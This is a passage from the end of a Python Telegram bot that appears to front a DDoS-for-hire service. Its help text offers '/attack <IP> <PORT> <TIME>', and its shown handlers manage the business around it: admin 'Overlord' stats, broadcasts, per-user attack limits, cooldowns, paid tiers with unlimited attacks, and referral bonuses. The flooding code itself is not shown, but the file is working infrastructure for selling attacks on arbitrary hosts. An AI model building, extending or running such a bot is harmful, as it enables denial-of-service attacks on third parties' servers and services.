        "📌 **/attack <IP> <PORT> <TIME>** - Launch a Thunder Strike! 💥🔥\n"
        "📌 **/check_cooldown** - Check global cooldown status! ⏳⏰\n"
        "📌 **/check_remaining_attack** - Check remaining attacks! ⚡💣\n"
    )

    overlord_commands = (
        "👑 **Overlord Commands** 👑👑\n\n"
        "⚡ **Only Overlords can use these commands!** ⚡💪\n\n"
        "📌 **/stats** - View bot usage stats! 📊📈\n"
        "📌 **/broadcast <message>** - Send a message to all users! 📢📣\n"
        "📌 **/reset <user_id>** - Reset a user's attack limit! 🔄♻️\n"
        "📌 **/setcooldown <seconds>** - Set global cooldown time! ⏳⏰\n"
        "📌 **/viewusers** - View all users' attack stats! 👥📊\n"
    )

    response = f"{user_commands}\n{overlord_commands if is_overlord else ''}\n📞 **Need Help? Contact Overlord {SUPPORT_CONTACT}** 📞🤗\n{branded_footer()} 😍🤗"
    bot.reply_to(message, response, parse_mode="Markdown")

@bot.message_handler(commands=['stats'])
def stats_command(message):
    user_id = str(message.from_user.id)
    if user_id not in OVERLORD_IDS:
        bot.reply_to(message, f"❌ **Access Denied!** ❌🚫\n"
                              f"⚠️ **Only Overlords can use this command!** ⚠️👑👑"
                              f"{branded_footer()} 😓😢")
        return

    total_users = len(user_data)
    total_attacks = sum(len(attacks) for attacks in attack_history.values())
    active_paid_users = sum(1 for user in PAID_USERS if is_paid_user(user))
    bot.reply_to(message, 
                 f"📊 **Thunder Command Stats** 📊📈\n\n"
                 f"👥 **Total Operatives:** {total_users} 🐣👶\n"
                 f"💥 **Total Strikes Launched:** {total_attacks} 💣💥\n"
                 f"💎 **Active Thunder Arsenal Operatives:** {active_paid_users} 🌟✨"
                 f"{branded_footer()} 😍🤗")

@bot.message_handler(commands=['broadcast'])
def broadcast_command(message):
    user_id = str(message.from_user.id)
    if user_id not in OVERLORD_IDS:
        bot.reply_to(message, f"❌ **Access Denied!** ❌🚫\n"
                              f"⚠️ **Only Overlords can use this command!** ⚠️👑👑"
                              f"{branded_footer()} 😓😢")
        return

    command = message.text.split(maxsplit=1)
    if len(command) < 2:
        bot.reply_to(message, f"❌ **Invalid Command Format!** ❌🚫\n"
                              f"📜 **Usage:** /broadcast <message> 📋\n"
                              f"{branded_footer()} 😓😢")
        return

    broadcast_message = command[1]
    for uid in user_data:
        try:
            bot.send_message(uid, 
                             f"📢 **Broadcast from Overlord** 📢📣\n\n"
                             f"{broadcast_message}\n\n"
                             f"⚡ **Stay tuned for more updates!** ⚡🌟"
                             f"{branded_footer()} 😍🤗")
        except Exception as e:
            logging.error(f"Error broadcasting to {uid}: {e}")
    bot.reply_to(message, f"✅ **Broadcast Sent!** ✅✔️\n"
                          f"📢 **Message sent to all operatives!** 📢📣"
                          f"{branded_footer()} 😍🤗")

@bot.message_handler(commands=['check_cooldown'])
def check_cooldown(message):
    if str(message.chat.id) not in GROUP_IDS:
        bot.reply_to(message, f"🚫 **Operative, This Works Only in Official Groups!** ❌\n"
                              f"🔗 **Join Now:** {CHANNEL_USERNAME}"
                              f"{branded_footer()} 😓😢")
        return

    user_id = str(message.from_user.id)
    if user_id not in user_data or not user_data[user_id]['last_attack']:
        bot.reply_to(message, f"✅ **No Cooldown Active. Strike Now!** ⚡💣"
                              f"{branded_footer()} 😍🤗")
        return

    time_since_last = (datetime.datetime.now() - user_data[user_id]['last_attack']).total_seconds()
    if time_since_last < COOLDOWN_TIME:
        remaining_time = int(COOLDOWN_TIME - time_since_last)
        bot.reply_to(message, f"⏳ **Cooldown Active:** {remaining_time} seconds remaining ⏰"
                              f"{branded_footer()} 😓😢")
    else:
        bot.reply_to(message, f"✅ **No Cooldown Active. Strike Now!** ⚡💣"
                              f"{branded_footer()} 😍🤗")

@bot.message_handler(commands=['check_remaining_attack'])
def check_remaining_attack(message):
    user_id = str(message.from_user.id)
    if str(message.chat.id) not in GROUP_IDS:
        bot.reply_to(message, f"🚫 **Operative, This Works Only in Official Groups!** ❌\n"
                              f"🔗 **Join Now:** {CHANNEL_USERNAME}"
                              f"{branded_footer()} 😓😢")
        return

    is_overlord = user_id in OVERLORD_IDS
    is_paid = is_paid_user(user_id)
    if is_overlord or is_paid:
        bot.reply_to(message, f"⚡ **You Have Unlimited Attacks!** ⚡👑💎"
                              f"{branded_footer()} 😍🤗")
    elif user_id not in user_data:
        bot.reply_to(message, f"⚡ **You Have {ATTACK_LIMIT} Attacks Remaining Today!** ⚡💣"
                              f"{branded_footer()} 😍🤗")
    else:
        user = user_data[user_id]
        total_attacks = user['attacks'] - user.get('referral_bonus', 0)
        remaining_attacks = ATTACK_LIMIT + user.get('referral_bonus', 0) - total_attacks
        bot.reply_to(message, f"⚡ **You Have {remaining_attacks} Attacks Remaining Today!** ⚡💣"
                              f"{branded_footer()} 😍🤗")

@bot.message_handler(commands=['reset'])
def reset_user(message):
    user_id = str(message.from_user.id)
    if user_id not in OVERLORD_IDS:
        bot.reply_to(message, f"❌ **Access Denied! Only Overlords Can Use This!** ❌👑"
                              f"{branded_footer()} 😓😢")
        return

    if str(message.chat.id) not in GROUP_IDS:
        bot.reply_to(message, f"🚫 **Operative, This Works Only in Official Groups!** ❌\n"
                              f"🔗 **Join Now:** {CHANNEL_USERNAME}"
                              f"{branded_footer()} 😓😢")
        return

    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, f"❌ **Usage:** /reset <user_id> ❌"
                              f"{branded_footer()} 😓😢")
        return

    target_id = command[1]
    if target_id in user_data:
        user_data[target_id]['attacks'] = 0
        save_users()
        bot.reply_to(message, f"✅ **Attack Limit Reset for User {target_id}!** ✅🔄"
                              f"{branded_footer()} 😍🤗")
    else:
        bot.reply_to(message, f"❌ **No Data Found for User {target_id}!** ❌"
                              f"{branded_footer()} 😓😢")

@bot.message_handler(commands=['setcooldown'])
def set_cooldown(message):
    user_id = str(message.from_user.id)
    if user_id not in OVERLORD_IDS:
        bot.reply_to(message, f"❌ **Access Denied! Only Overlords Can Use This!** ❌👑"
                              f"{branded_footer()} 😓😢")
        return

    if str(message.chat.id) not in GROUP_IDS:
        bot.reply_to(message, f"🚫 **Operative, This Works Only in Official Groups!** ❌\n"
                              f"🔗 **Join Now:** {CHANNEL_USERNAME}"
                              f"{branded_footer()} 😓😢")
        return

    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, f"❌ **Usage:** /setcooldown <seconds> ❌"
                              f"{branded_footer()} 😓😢")
        return

    global COOLDOWN_TIME
    try:
        COOLDOWN_TIME = int(command[1])
        bot.reply_to(message, f"✅ **Cooldown Set to {COOLDOWN_TIME} Seconds!** ✅⏳"
                              f"{branded_footer()} 😍🤗")
    except ValueError:
        bot.reply_to(message, f"❌ **Please Provide a Valid Number of Seconds!** ❌"
                              f"{branded_footer()} 😓😢")

@bot.message_handler(commands=['viewusers'])
def view_users(message):
    user_id = str(message.from_user.id)
    if user_id not in OVERLORD_IDS:
        bot.reply_to(message, f"❌ **Access Denied! Only Overlords Can Use This!** ❌👑"
                              f"{branded_footer()} 😓😢")
        return

    if str(message.chat.id) not in GROUP_IDS:
        bot.reply_to(message, f"🚫 **Operative, This Works Only in Official Groups!** ❌\n"
                              f"🔗 **Join Now:** {CHANNEL_USERNAME}"
                              f"{branded_footer()} 😓😢")
        return

    user_list = "\n".join([f"🆔 **User ID:** {uid}, **Attacks Used:** {data['attacks'] - data.get('referral_bonus', 0)}, "
                           f"**Remaining:** {ATTACK_LIMIT + data.get('referral_bonus', 0) - (data['attacks'] - data.get('referral_bonus', 0))}" 
                           for uid, data in user_data.items() if uid not in OVERLORD_IDS])
    bot.reply_to(message, f"📊 **User Summary (Non-Overlords):**\n\n{user_list}\n\n"
                          f"⚡ **Overlords Have Unlimited Attacks!** ⚡👑"
                          f"{branded_footer()} 😍🤗")

# Load data on startup
load_users()
load_feedback_hashes()
load_referrals()
load_attack_history()
load_ranks()
load_paid_users()

# Start bot
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        logging.error(f"Polling error: {e}")
        time.sleep(15)